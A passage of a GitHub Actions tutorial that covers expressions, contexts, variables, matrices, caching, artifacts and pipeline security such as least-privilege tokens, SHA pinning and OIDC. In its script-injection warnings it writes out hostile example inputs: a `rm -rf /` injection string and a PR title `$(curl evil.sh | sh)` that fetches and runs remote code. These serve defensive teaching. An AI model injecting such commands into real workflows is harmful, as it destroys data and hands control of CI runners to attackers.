Why: a public repo accepts pull requests from **anyone**. A fork PR's workflow can run **arbitrary code**, and on a non-ephemeral self-hosted runner that code executes on *your* machine, inside *your* network, and can **persist** (install a backdoor, harvest credentials, pivot to internal systems, poison the toolchain so the *next* legitimate job is compromised). GitHub's own documentation warns against it explicitly. Hosted runners are safe here precisely because they're throwaway VMs isolated from your network.

If you must use self-hosted runners at all, harden them:
- **Only on private/internal repos** you control who can open PRs to.
- Make them **ephemeral** — register with `--ephemeral` so the runner processes exactly one job then deregisters, and rebuild the host from a clean image (e.g. with **Actions Runner Controller** on Kubernetes, or autoscaling ephemeral VMs). This restores the "clean slate per job" property.
- **Least privilege:** run the runner as a non-root, unprivileged user; restrict its network egress; never give it cloud admin credentials (use OIDC, §9.7).
- **Require approval** for workflows from first-time contributors (repo setting), and restrict which workflows can use self-hosted runners.
- Keep the runner agent and OS patched.

### 5.5 Larger runners **[A]**

GitHub also offers **larger hosted runners** — bigger machines (more vCPUs/RAM, up to 64+ cores), **GPU** runners, and **ARM64** runners — configured at the org level and selected by a custom label (or `runs-on` with size). They give you hosted-runner safety (ephemeral, managed) with self-hosted-class power, at a higher per-minute price. Use them for heavy compilation, large test matrices, or GPU/ML jobs without taking on the security burden of self-hosting.

```yaml
jobs:
  heavy-build:
    runs-on: ubuntu-latest-16-core   # Example: an org-configured larger runner label.
```

---

## 6. Variables, Contexts & Expressions

This section is the "programming language" of workflows — how you read information, set variables, pass data between steps and jobs, and write conditionals. It's where beginners get stuck, so we go slowly.

### 6.1 The `${{ }}` expression syntax **[I]**

Anywhere you write **`${{ <expression> }}`**, GitHub evaluates the expression *before* running the step and substitutes the result. Inside the braces you can reference **contexts** (objects full of data), call **functions**, and use **operators** (`==`, `!=`, `&&`, `||`, `!`, `<`, `>`). Outside `if:`, the braces are required; inside `if:`, they're optional (GitHub assumes an expression). The *why*: workflows are static YAML, but you need dynamic values (the branch name, a secret, a matrix value, the result of a previous job) — expressions are how you splice those in.

```yaml
steps:
  - run: echo "Branch is ${{ github.ref_name }}"     # context access
  - run: echo "Up to ${{ 2 + 3 }}"                    # arithmetic/operators
  - if: github.event_name == 'push'                   # `if:` — braces optional
    run: echo "this was a push"
```

### 6.2 Contexts — the data objects **[I]**

A **context** is a structured object of read-only data you access via dot notation inside `${{ }}`. The essential ones:

| Context | What it holds | Common fields |
|---|---|---|
| **`github`** | Info about the event, repo, and run | `github.sha`, `github.ref`, `github.ref_name`, `github.event_name`, `github.actor`, `github.repository`, `github.run_id`, `github.workspace`, `github.token` |
| **`env`** | Environment variables you set with `env:` | `env.NODE_ENV` |
| **`vars`** | **Configuration variables** (non-secret, set in repo/org/env settings) | `vars.API_URL` |
| **`secrets`** | **Secrets** (encrypted) | `secrets.GITHUB_TOKEN`, `secrets.MY_SECRET` |
| **`matrix`** | The current matrix combination's values | `matrix.node`, `matrix.os` |
| **`needs`** | Outputs/results of jobs this job `needs` | `needs.build.outputs.x`, `needs.build.result` |
| **`steps`** | Outputs/outcome of earlier steps (by `id`) | `steps.<id>.outputs.<name>`, `steps.<id>.outcome` |
| **`job`** | Info about the current job | `job.status`, `job.container.id` |
| **`runner`** | The runner machine | `runner.os`, `runner.temp`, `runner.arch` |
| **`inputs`** | `workflow_dispatch`/`workflow_call` inputs | `inputs.environment` |

> **Security gotcha:** Some `github` fields are **attacker-controlled** on PRs from forks — `github.event.pull_request.title`, `github.head_ref`, issue/PR body. **Never** interpolate those directly into a `run:` shell command (`run: echo "${{ github.event.pull_request.title }}"`) — a title like `"; rm -rf / #` is a **script injection**. Instead, pass them through an `env:` var and reference the env var in the script (so the shell, not the YAML templater, handles the value). See §9.

### 6.3 Default environment variables **[I]**

The runner always provides a set of **default env vars** (and matching `github`-context fields). The most-used:

- **`GITHUB_SHA`** / `github.sha` — the commit SHA that triggered the run.
- **`GITHUB_REF`** / `github.ref` — the full ref (`refs/heads/main`, `refs/tags/v1.0`, `refs/pull/12/merge`); `github.ref_name` is the short form (`main`).
- **`GITHUB_REPOSITORY`** — `owner/repo`.
- **`GITHUB_RUN_ID`** / `GITHUB_RUN_NUMBER` — unique run identifiers (handy for tagging artifacts/images).
- **`GITHUB_WORKSPACE`** — the directory the repo is checked out into (the default cwd).
- **`RUNNER_OS`** / `RUNNER_TEMP` / `RUNNER_ARCH` — OS, a temp dir, the architecture.
- **`GITHUB_ENV`**, **`GITHUB_OUTPUT`**, **`GITHUB_STEP_SUMMARY`**, **`GITHUB_PATH`** — special **files** you write to (next sections).

### 6.4 Setting env vars: `env:` at three levels, and `$GITHUB_ENV` **[I]**

You set environment variables two ways, and the distinction matters:

**1. The `env:` key** — declared statically in YAML at the **workflow**, **job**, or **step** level. Narrower scopes override wider ones.

```yaml
env:                             # WORKFLOW-level: visible to every job/step.
  APP_NAME: myapp
jobs:
  build:
    env:                         # JOB-level: visible to every step in `build` (overrides workflow).
      NODE_ENV: production
    runs-on: ubuntu-latest
    steps:
      - run: echo "$APP_NAME in $NODE_ENV"   # → "myapp in production"
        env:                     # STEP-level: only this step (overrides job/workflow).
          NODE_ENV: test
      - run: echo "$NODE_ENV"    # → "production" (the step override doesn't leak to the next step)
```

**2. Writing to the `$GITHUB_ENV` file** — to set an env var **dynamically at runtime** that **persists to *later steps*** in the same job. A normal `export X=...` in a `run:` step would vanish when that step's shell exits; appending `name=value` to the file at `$GITHUB_ENV` makes the runner inject it into *subsequent* steps' environments.

```yaml
steps:
  - name: Compute a value and export it
    run: |
      VERSION=$(date +%Y%m%d)-${GITHUB_SHA::7}    # e.g. 20260624-a1b2c3d
      echo "BUILD_VERSION=$VERSION" >> "$GITHUB_ENV"   # ← persists to LATER steps in this job.
  - name: Use it
    run: echo "Building $BUILD_VERSION"           # available because previous step wrote $GITHUB_ENV
```

> **⚡ Version note / security:** The old `::set-env::` and `::set-output::` **workflow commands were removed** for security. Use the **environment files** `$GITHUB_ENV` and `$GITHUB_OUTPUT` instead. For **multi-line values**, use the heredoc delimiter form to avoid injection (shown in §6.5).

### 6.5 Step outputs: `$GITHUB_OUTPUT` **[I]**

A **step output** is a named value a step exposes so *later steps* (or, when promoted to a job output, other *jobs*) can consume it. You set one by giving the step an **`id:`** and appending `name=value` to the file at **`$GITHUB_OUTPUT`**, then read it via the `steps` context.

```yaml
steps:
  - name: Determine tag
    id: meta                                  # ← needed so we can reference steps.meta.*
    run: |
      echo "tag=v1.2.3" >> "$GITHUB_OUTPUT"   # single-line output

      # Multi-line output (e.g. a changelog) — use a unique heredoc delimiter:
      {
        echo "notes<<EOF"
        echo "Line 1 of release notes"
        echo "Line 2"
        echo "EOF"
      } >> "$GITHUB_OUTPUT"

  - name: Use the output
    run: |
      echo "Tag is ${{ steps.meta.outputs.tag }}"
      echo "Notes:"
      echo "${{ steps.meta.outputs.notes }}"
```

### 6.6 Job outputs — passing data *between jobs* **[I/A]**

Because jobs run on **different machines** with **no shared filesystem**, the way one job hands a *value* to a downstream job is via **job outputs**: a job declares `outputs:` mapping names to step outputs, and the consuming job reads them through the **`needs`** context. (For *files*, use artifacts — §8.)

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:                                  # ← declare what this job exposes
      image-tag: ${{ steps.gen.outputs.tag }} # ← map a job output to a step output
    steps:
      - id: gen
        run: echo "tag=sha-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"

  build:
    needs: [setup]                            # ← create the dependency + access to its outputs
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building image tagged ${{ needs.setup.outputs.image-tag }}"
```

### 6.7 Conditionals: `if:` and status-check functions **[I]**

The **`if:`** key controls whether a step or job runs. It's evaluated as an expression (braces optional). Beyond comparing context values, you use **status-check functions** that report the state of the run **so far** — crucial because, by default, **a step is skipped once a previous step failed**, so a "cleanup/notify on failure" step needs `if: failure()` to run anyway.

| Function | Runs the step when… |
|---|---|
| **`success()`** | all previous steps/jobs succeeded (this is the *implicit default* `if`) |
| **`failure()`** | any previous step/job has failed |
| **`always()`** | **always** — even after a failure or cancellation (use for cleanup/notifications) |
| **`cancelled()`** | the run was cancelled |

```yaml
steps:
  - run: npm test                          # if this fails…

  - name: Upload coverage
    if: success()                          # …this is SKIPPED (default behaviour anyway)
    run: ./upload-coverage.sh

  - name: Notify Slack on failure
    if: failure()                          # …but THIS runs, precisely because a step failed
    run: ./notify-slack.sh "CI failed on ${{ github.ref_name }}"

  - name: Always clean up
    if: always()                           # runs no matter what (success, failure, cancel)
    run: ./cleanup.sh

  - name: Deploy only on main pushes
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    run: ./deploy.sh
```

> **Gotcha:** If you add *any* custom `if:` (like `if: github.ref == 'refs/heads/main'`), you **lose** the implicit `success()` guard — the step will now also run *after a prior failure*. To keep both conditions, combine them: `if: success() && github.ref == 'refs/heads/main'`.

### 6.8 Useful expression functions **[I]**

| Function | Purpose | Example |
|---|---|---|
| `contains(haystack, needle)` | substring / array membership | `contains(github.event.head_commit.message, '[skip ci]')` |
| `startsWith` / `endsWith` | prefix / suffix test | `startsWith(github.ref, 'refs/tags/')` |
| `format(fmt, a, b, …)` | string interpolation with `{0}` placeholders | `format('image:{0}', github.sha)` |
| `join(array, sep)` | join an array to a string | `join(matrix.*.os, ', ')` |
| `toJSON(value)` | serialize to JSON (great for debugging contexts) | `run: echo '${{ toJSON(github) }}'` |
| `fromJSON(string)` | parse JSON → object/array (used to build dynamic matrices, §7.2) | `fromJSON(needs.setup.outputs.matrix)` |
| `hashFiles(glob…)` | a hash of matching files (cache keys, §8) | `hashFiles('**/package-lock.json')` |

### 6.9 Operators & truthiness **[I]**

Expressions support a small operator set. Knowing the precedence and coercion rules avoids subtle `if:` bugs:

| Operator | Meaning | Note |
|---|---|---|
| `==` `!=` | equality | string/number compare; **case-insensitive** for strings |
| `<` `<=` `>` `>=` | ordering | numeric compare |
| `&&` `\|\|` | logical and/or | also used for **defaulting**: `${{ inputs.x \|\| 'fallback' }}` |
| `!` | logical not | `if: ! cancelled()` |
| `( )` | grouping | clarify precedence |

**Truthiness & coercion** (the source of most `if:` confusion):
- An **empty string** `''`, the number **`0`**, and **`false`** are *falsy*; everything else is *truthy*.
- GitHub **coerces** across types when comparing — `'true' == true` is **true**, and `'' == 0` is **true**. Be explicit (`inputs.flag == 'true'`) when an input is a *string* `'true'` (from `github.event.inputs`) versus a real boolean (from the typed `inputs` context).
- The `&&`/`||` "ternary" trick: `${{ condition && 'A' || 'B' }}` returns `'A'` when `condition` is truthy, else `'B'` — handy for picking a value inline (just ensure the "A" value is itself truthy, or the `||` falls through).

```yaml
# Pick an environment name based on the branch, inline:
  - run: echo "Deploying to ${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}"
```

### 6.10 `vars` vs `secrets` vs `env` — three kinds of "variable" **[I]**

Beginners conflate these. They are distinct:
- **`secrets`** — **encrypted**, masked in logs, for sensitive values (keys, tokens). Set in repo/env/org settings. Read with `${{ secrets.X }}`.
- **`vars`** — **plaintext configuration variables** (NOT encrypted, NOT masked), for non-sensitive config you want to change without editing YAML (an API base URL, a feature flag, a region). Set in the same settings UI as secrets but under "Variables". Read with `${{ vars.X }}`.
- **`env`** — environment variables you define *in the workflow YAML* (or write at runtime via `$GITHUB_ENV`), visible to processes as actual env vars. Read in expressions with `${{ env.X }}` or in shells as `$X`.

The decision rule: **sensitive → `secrets`; non-sensitive but configurable → `vars`; in-workflow scratch values → `env`.** Putting a secret in `vars` exposes it in plaintext; putting config in `secrets` works but hides it unnecessarily and prevents it appearing in logs you might want to read.

---

## 7. Jobs Orchestration — `needs`, Matrix, Conditionals

By default all jobs run **in parallel**. Real pipelines need *ordering* (deploy after test), *fan-out* (test on many versions), and *fan-in* (one release after several builds). That's what this section is.

### 7.1 `needs` — dependencies & the DAG **[I]**

**`needs:`** declares that a job must wait for one or more other jobs to **complete successfully** before it starts. This turns your set of jobs into a **Directed Acyclic Graph (DAG)**: independent jobs run concurrently; dependent ones run in sequence. The *why*: correctness (don't deploy untested code) and speed (run everything that *can* be parallel, in parallel).

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps: [{ run: echo "lint" }]

  test:
    runs-on: ubuntu-latest
    steps: [{ run: echo "test" }]
    # lint and test have no `needs:` → they run IN PARALLEL.

  build:
    needs: [lint, test]          # ← waits for BOTH lint AND test to succeed.
    runs-on: ubuntu-latest
    steps: [{ run: echo "build" }]

  deploy:
    needs: [build]               # ← waits for build (transitively, for lint+test too).
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'   # …and only on main.
    steps: [{ run: echo "deploy" }]
```

```
   lint  ┐
         ├─►  build  ─►  deploy   (lint & test run in parallel; build waits for both; deploy waits for build)
   test  ┘
```

> By default, if any needed job fails, the dependent job is **skipped**. To run a dependent job *even if* a dependency failed (e.g. an "always notify" job), give it `if: always()` (or `if: failure()`), and read `needs.<job>.result` to branch.

### 7.2 Matrix builds — test across versions/OSes **[I/A]**

A **matrix** runs the *same job* many times with different parameter combinations — the canonical use is "test my code on Node 18, 20, 22 across Linux, Windows, and macOS." GitHub **automatically generates one job per combination** and runs them in parallel. The *why*: prove your software works across the versions/platforms your users have, without copy-pasting jobs.

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}    # ← runner chosen FROM the matrix
    strategy:
      fail-fast: true            # If one combo fails, CANCEL the rest (faster feedback). Default true.
                                 # Set false to let ALL combos finish (full picture of what's broken).
      max-parallel: 4            # Cap how many matrix jobs run at once (save runners/minutes).
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [18, 20, 22]
        # → 3 OSes × 3 Node versions = 9 jobs generated automatically.

        include:                 # ADD extra combos or extra VARIABLES to existing combos:
          - os: ubuntu-latest
            node: 20
            coverage: true       # adds a `matrix.coverage` flag to JUST this combo
          - os: ubuntu-latest
            node: 23             # a brand-new combo not in the cross-product (experimental version)

        exclude:                 # REMOVE specific combos from the cross-product:
          - os: macos-latest
            node: 18             # don't bother testing Node 18 on macOS

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}   # ← use the matrix value
      - run: npm ci && npm test
      - if: matrix.coverage == true          # the `include`d flag
        run: npm run coverage
```

**Key matrix keys:** `fail-fast` (cancel siblings on first failure — great for fast feedback, bad when you want to *see all* failures), `max-parallel` (throttle concurrency), `include` (extend), `exclude` (prune).

**Dynamic matrices:** you can build the matrix at runtime by having a prior job emit a JSON array as an output and feeding it through `fromJSON`:

```yaml
jobs:
  define:
    runs-on: ubuntu-latest
    outputs:
      versions: ${{ steps.set.outputs.versions }}
    steps:
      - id: set
        run: echo 'versions=["18","20","22"]' >> "$GITHUB_OUTPUT"
  test:
    needs: define
    strategy:
      matrix:
        node: ${{ fromJSON(needs.define.outputs.versions) }}   # ← matrix from JSON
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v4
        with: { node-version: '${{ matrix.node }}' }
      - run: node --version
```

### 7.3 Conditional jobs & passing outputs downstream **[I/A]**

Combine §6.6 (job outputs) with `needs` to fan-in: e.g. a `release` job that runs only on tags and consumes a version computed by an earlier job. We saw the mechanics in §6.6; the production examples in §12–§13 use this pattern end-to-end.

---

## 8. Caching & Artifacts

These are two *different* tools that beginners conflate. **Caching** speeds up *future* runs by reusing downloaded dependencies. **Artifacts** move *files* between jobs of the *same* run, or out to you for download. Use the right one.

### 8.1 `actions/cache` — speeding up dependency installs **[I]**

Every fresh runner starts empty, so re-downloading and rebuilding dependencies (npm modules, Go modules, pip packages, build caches) every run is slow and wasteful. **`actions/cache`** stores a directory after a run and **restores it at the start of future runs**, keyed by a hash of your lockfile. When the lockfile is unchanged, the cache **hits** and the install is near-instant; when it changes, the key changes, the cache **misses**, and you rebuild + save a fresh cache. The *why*: dramatic speedups (often minutes → seconds) and fewer flaky network downloads.

The **cache key** is the heart of it:
- **`key:`** — the exact key to look for and to save under. Make it depend on the OS and a **hash of the lockfile** (`hashFiles('**/package-lock.json')`) so it changes precisely when dependencies change.
- **`restore-keys:`** — *fallback prefixes* used when the exact `key` misses. They let you restore a *slightly stale* cache (e.g. last week's deps) as a starting point, then update it — far better than starting from nothing.

```yaml
steps:
  - uses: actions/checkout@v4

  - name: Cache npm dependencies
    uses: actions/cache@v4
    with:
      path: ~/.npm                                   # WHAT to cache (npm's download cache dir).
      key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
      #     └ OS ──────────┘ └ tool ┘ └ exact hash of the lockfile ────┘
      #    Changes ONLY when the lockfile changes → precise invalidation.
      restore-keys: |                                # Fallbacks (longest-prefix match wins):
        ${{ runner.os }}-npm-                        # any previous npm cache for this OS
  - run: npm ci
```

**Language note — the easy way:** the `setup-*` actions have **built-in caching** that handles paths and keys for you. Prefer this for the common case:

```yaml
  - uses: actions/setup-node@v4
    with:
      node-version: '20'
      cache: 'npm'              # ← auto-caches based on package-lock.json. (also: 'yarn' | 'pnpm')

  - uses: actions/setup-go@v5
    with:
      go-version: '1.23'
      cache: true              # ← caches the Go module + build cache automatically.

  - uses: actions/setup-python@v5
    with:
      python-version: '3.12'
      cache: 'pip'             # ← caches pip downloads.
```

> **Cache gotchas:** Caches are **immutable once written** for a key (you can't overwrite a key — change the key to refresh). There's a per-repo **cache size limit (~10 GB)** with LRU eviction. **Caches are scoped by branch** — a branch can read caches from itself, its base branch, and the default branch, but not arbitrary sibling branches (a security boundary). **Never cache secrets or credentials.** Don't cache things that are cheap to recompute or that *should* be re-fetched (cache is for *reproducible* downloads).

### 8.2 Artifacts — `upload-artifact` / `download-artifact` (v4) **[I]**

An **artifact** is a **file or set of files produced by a run** that you (a) want to **pass from one job to another** (since jobs don't share a filesystem), or (b) want to **download and inspect** (a built binary, a coverage report, test logs, a compiled web bundle). You **upload** in the producing job and **download** in the consuming job (or from the run's web page).

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build          # produces ./dist
      - name: Upload build output
        uses: actions/upload-artifact@v4
        with:
          name: web-dist                       # the artifact's name (used to download it)
          path: dist/                          # file(s)/dir to upload (globs allowed)
          retention-days: 7                    # auto-delete after N days (default 90; saves storage)
          if-no-files-found: error             # fail if `path` matched nothing (catch silent bugs)

  deploy:
    needs: [build]
    runs-on: ubuntu-latest
    steps:
      - name: Download build output
        uses: actions/download-artifact@v4
        with:
          name: web-dist                       # same name as uploaded
          path: dist/                          # where to restore it on THIS runner
      - run: ls -la dist/ && ./deploy.sh
```

> **⚡ Version note (critical):** **Artifacts v4 is mandatory** — **v3 was deprecated and has been shut down**, and **v4 is NOT backward-compatible with v3** (you cannot mix `upload-artifact@v4` with `download-artifact@v3`). v4 is much faster, and changed two behaviours you must know: (1) **artifact names must be unique within a run** — uploading twice with the same `name` errors (in a *matrix*, give each combo a unique name like `name: dist-${{ matrix.os }}`); (2) downloading **without a `name`** now downloads *all* artifacts into subdirectories. Use `pattern:` + `merge-multiple:` to recombine matrix artifacts.

### 8.3 Cache vs artifact — choosing **[I]**

| | **Cache** | **Artifact** |
|---|---|---|
| Purpose | Speed up *future* runs | Move *files* in *this* run / download them |
| Lifetime | Until evicted (LRU, ~10 GB cap) | `retention-days` (default 90) |
| Content | Reproducible deps/build caches | Build outputs, reports, binaries |
| Keyed by | A computed `key` (lockfile hash) | A `name` |
| Rule of thumb | "I could re-download this" | "I produced this and need it elsewhere/later" |

---

## 9. Secrets & Security

CI/CD systems are high-value targets: they hold deploy credentials, can push code, and run automatically. This is the section to read most carefully. The themes: **store secrets properly, give the token least privilege, never run untrusted code with credentials, pin your supply chain, and prefer keyless auth (OIDC).**

### 9.1 What a secret is & where it lives **[I]**

A **secret** is an **encrypted** value (an API key, a deploy token, a password) that GitHub stores and injects into workflows on demand, **never displaying it** in logs (it auto-masks any secret value that appears in output). You read secrets via the **`secrets`** context. There are three scopes:

- **Repository secrets** — available to workflows in that one repo.
- **Environment secrets** — scoped to a deployment **environment** (`staging`, `production`) and gated by that environment's protection rules (§11). This is how you keep prod creds away from non-prod jobs.
- **Organization secrets** — shared across many repos (with optional repo allow-lists), so you set a value once for the whole org.

```yaml
jobs:
  deploy:
    environment: production       # ← unlocks this environment's secrets + protection rules (§11)
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.PROD_API_KEY }}   # injected, encrypted, auto-masked in logs
```

### 9.2 Never echo or leak secrets **[I/A]**

GitHub auto-masks secret *values* in logs, but you can still leak them through carelessness, so follow these rules:
- **Don't `echo` secrets** (`run: echo ${{ secrets.X }}`) — even masked, it's a smell, and transformations (base64, substrings) can defeat masking.
- **Pass secrets via `env:`**, not by interpolating `${{ secrets.X }}` directly into a shell command string (interpolation risks injection and shows up in the command).
- **Don't pass secrets to untrusted third-party actions** unless you trust (and pin) them.
- **Don't write secrets to artifacts, caches, or `$GITHUB_OUTPUT`** (outputs and artifacts are not masked the same way and may be downloadable).
- Treat **`vars`** (configuration variables) as *public* — they are **not** encrypted; only put non-sensitive config there.

### 9.3 `GITHUB_TOKEN` & `permissions:` — least privilege **[I/A]**

Every workflow run automatically gets a **`GITHUB_TOKEN`** — a short-lived credential (it expires when the job ends) that authenticates as a special **GitHub App** scoped to *this repository*. You use it to call the GitHub API: push commits, create releases, comment on PRs, push to GHCR, etc., **without** creating a personal access token. It's automatically available as `secrets.GITHUB_TOKEN` and `github.token`.

Its danger is **excessive permissions**. By default a token *can* be granted broad read/write across many scopes. The **`permissions:`** key lets you **restrict it to least privilege** — declare exactly the scopes the job needs and nothing more, so that *if* the workflow is compromised, the blast radius is minimal.

```yaml
permissions:                     # WORKFLOW-level default for all jobs (can override per-job).
  contents: read                 # ← start from READ-ONLY everything by declaring just what you need.

jobs:
  release:
    runs-on: ubuntu-latest
    permissions:                 # JOB-level override: this job needs more.
      contents: write            # to create a release / push a tag
      packages: write            # to push an image to GHCR
      id-token: write            # to request an OIDC token (§9.7) — REQUIRED for keyless cloud auth
    steps:
      - uses: actions/checkout@v4
      - run: gh release create "v1.0.0" --generate-notes
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Best practice:** put `permissions: contents: read` at the **top (workflow) level** as a restrictive default, then **grant additional scopes only on the specific jobs that need them**. Common scopes: `contents` (code/releases), `packages` (GHCR), `pull-requests`, `issues`, `id-token` (OIDC), `deployments`, `actions`, `checks`, `statuses`.

> **⚡ Version note:** GitHub's recommended default (and the default on many newer repos/orgs) is a **read-only** `GITHUB_TOKEN`. Don't rely on the old permissive default — **always declare `permissions:` explicitly** so your workflow is correct regardless of the repo setting and follows least privilege.

### 9.4 Don't grant the token write you don't use **[A]**

A frequent mistake: copying a workflow that has `permissions: write-all` (or no `permissions:` on an old permissive repo). If your CI only builds and tests, it needs `contents: read` and nothing else. A read-only token that gets exfiltrated can't push malicious commits or publish packages. Treat write scopes like sharp tools — grant them on the *one* job that needs them, for the *minimum* set.

### 9.5 Script injection from untrusted input **[A]**

As warned in §6.2: PR titles, branch names, issue bodies, and commit messages from forks are **attacker-controlled**. Interpolating them into a `run:` script lets an attacker inject shell commands. **Always launder untrusted input through an `env:` variable**, which is passed to the process as data, not spliced into the command text:

```yaml
# ❌ DANGEROUS — a PR title of  $(curl evil.sh | sh)  executes on your runner:
# - run: echo "Title: ${{ github.event.pull_request.title }}"

# ✅ SAFE — the value is an env var; the shell sees it as a string, not code:
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

### 9.6 Pinning third-party actions to a full SHA (supply chain) **[A]**

When you write `uses: some-org/some-action@v3`, that tag is **mutable** — the owner (or an attacker who compromises their account) can re-point `v3` to malicious code, which then runs **inside your pipeline with your token and secrets**. This is a real supply-chain attack vector (it has happened to popular actions). The defence is to **pin to an immutable full commit SHA** instead of a tag, so the code can never change underneath you:

```yaml
steps:
  # ❌ Mutable — the tag can be moved to malicious code:
  # - uses: some-org/some-action@v3

  # ✅ Immutable — pinned to an exact commit; add a comment noting the human-readable version:
  - uses: some-org/some-action@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0  # v3.2.1
```

**Rules:** Pin **all third-party** actions to a full 40-char SHA. First-party `actions/*` and trusted vendor actions (`docker/*`, `aws-actions/*`) are commonly pinned to major tags (`@v4`) for convenience, but SHA-pinning them too is the most defensive stance. Use **Dependabot** to keep pinned SHAs updated automatically (next section).

### 9.7 OIDC — keyless cloud authentication **[A]**

This is one of the most important modern security upgrades. The old way to deploy to AWS/GCP/Azure from Actions was to create a long-lived cloud access key, store it as a GitHub secret, and hope it never leaks. The problems: **long-lived static credentials** sitting in secrets are a permanent liability — if they leak (via a log, a malicious action, a compromised runner), an attacker has standing access until someone notices and rotates them.

**OIDC (OpenID Connect)** eliminates the stored key entirely. With OIDC, GitHub Actions acts as an **identity provider**: at runtime, the workflow requests a **short-lived, signed JWT token** from GitHub that *cryptographically proves* "this is a job from `repo X`, on `branch main`, in environment `production`." Your cloud provider is configured to **trust GitHub's OIDC issuer** and to exchange that proof for **temporary cloud credentials** scoped to a specific role — credentials that **expire in minutes** and were **never stored anywhere**. The *why OIDC is better*: **no long-lived secrets to leak or rotate**, fine-grained trust (you can require a specific repo *and* branch *and* environment), and full auditability.

The mechanics: you grant the job **`id-token: write`** permission (so it can mint the OIDC token), then use the cloud's official login action, which performs the token exchange.

```yaml
permissions:
  id-token: write                # ← REQUIRED: lets the job request the OIDC JWT.
  contents: read

jobs:
  deploy-aws:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: us-east-1
          # ↑ NO aws-access-key-id / aws-secret-access-key! GitHub mints a short-lived
          #   OIDC token; AWS STS exchanges it for temporary creds for this exact role.
      - run: aws s3 sync ./dist s3://my-bucket --delete    # now authenticated, keylessly
```

> On the cloud side you set up a **trust policy / Workload Identity** that trusts GitHub's OIDC issuer (`token.actions.githubusercontent.com`) and constrains the **subject** to your repo/branch/environment (e.g. `repo:my-org/my-repo:ref:refs/heads/main`). Equivalent actions exist for GCP (`google-github-actions/auth`) and Azure (`azure/login`). **Prefer OIDC over static cloud keys wherever the provider supports it.**

### 9.8 Dependabot & secret scanning **[I/A]**

Two GitHub features that harden the pipeline supply chain:
- **Dependabot** — automatically opens PRs to **update your dependencies *and* your pinned Action SHAs** when newer versions (or security fixes) are available. Enable it for the `github-actions` ecosystem so SHA-pinned actions stay current without manual tracking:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"   # keep action versions/SHAs updated
    directory: "/"
    schedule: { interval: "weekly" }
  - package-ecosystem: "npm"              # also keep app deps updated
    directory: "/"
    schedule: { interval: "weekly" }
```

- **Secret scanning & push protection** — GitHub scans commits/pushes for credential patterns (AWS keys, tokens) and can **block a push** that contains a recognized secret. Combined with never committing `.env` files (see Docker/Node guides), this catches accidental leaks before they land.

---

## 10. Reusable & Composite Actions

DRY (Don't Repeat Yourself) applies to pipelines too. The three reuse mechanisms — **composite actions**, **reusable workflows**, and **custom actions** — let you write automation once and use it everywhere.

### 10.1 Composite actions — bundle steps into one action **[I/A]**

A **composite action** packages a sequence of steps into a single reusable `uses:`-able action, defined by an `action.yml`. Use it to factor out a repeated *series of steps* (e.g. "checkout + setup Node + install deps with caching") that several jobs share. The *why*: instead of repeating five steps in ten jobs, you write them once and call one action.

```yaml
# .github/actions/setup-project/action.yml   (a LOCAL composite action)
name: 'Setup Project'
description: 'Checks out, installs Node, and runs a cached install'
inputs:
  node-version:
    description: 'Node version'
    required: false
    default: '20'
runs:
  using: 'composite'             # ← marks this as a composite action
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'
    - run: npm ci
      shell: bash                # ← composite `run:` steps MUST specify a shell
```

Use it from a workflow:

```yaml
steps:
  - uses: actions/checkout@v4
  - uses: ./.github/actions/setup-project    # ← path to your local composite action
    with:
      node-version: '22'
```

### 10.2 Reusable workflows vs composite actions — which? **[A]**

Both reduce duplication but operate at different levels:
- A **composite action** factors out **steps within a job** (it can't define jobs, `runs-on`, or run things in parallel). It's lightweight and great for "setup" sequences.
- A **reusable workflow** factors out **whole jobs** (it *is* a workflow with its own jobs, runners, matrices, environments). Use it to share an entire CI or deploy *pipeline* across repos.

### 10.3 Custom actions — JS, Docker, composite **[A]**

When you want to *publish* reusable logic (to the Marketplace or share across orgs), you write a **custom action**, in one of three forms:
- **JavaScript action** — code runs directly on the runner via **Node 20**; fastest startup; great for API calls and logic. Defined with `runs: { using: 'node20', main: 'dist/index.js' }`.
- **Docker container action** — runs your logic inside a container you specify; use when you need a specific OS/toolchain. Slower to start (image pull/build); Linux-only.
- **Composite action** — §10.1; pure YAML steps, no code to compile.

Pick **JavaScript** for most custom logic (fast, cross-platform), **Docker** when you need system tools not on the runner, **composite** when it's just a sequence of existing steps.

**Writing a minimal JavaScript action.** Every custom action is a directory with an **`action.yml`** metadata file describing its inputs, outputs, and entry point. Here is a complete tiny JS action that reads an input and writes an output, using the official `@actions/core` toolkit (which wraps the `$GITHUB_OUTPUT`/masking/logging machinery so you don't touch the raw files):

```yaml
# my-action/action.yml — the metadata that makes a directory an "action"
name: 'Greet'
description: 'Greets a name and outputs the greeting'
inputs:
  who:
    description: 'Who to greet'
    required: true
    default: 'world'
outputs:
  greeting:
    description: 'The composed greeting'
runs:
  using: 'node20'          # ← run main.js on the Node 20 runtime
  main: 'dist/index.js'    # ← the compiled/bundled entry point (commit the bundle, or build in CI)
```

```javascript
// my-action/src/index.js  (bundle to dist/index.js with esbuild/ncc before publishing)
